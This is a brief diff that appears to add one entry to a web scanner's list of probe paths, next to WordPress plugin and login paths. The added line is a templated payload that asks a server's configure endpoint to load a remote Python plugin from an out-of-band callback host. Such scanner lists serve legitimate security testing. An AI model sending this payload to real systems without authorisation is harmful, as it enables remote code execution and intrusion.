@@ -42,3 +42,4 @@
 /wp-content/plugins/everest-forms/readme.txt
 /en/login
 /login.do
+/rest/configure?plugins=http://{{interactsh-url}}/{{randstr}}.py
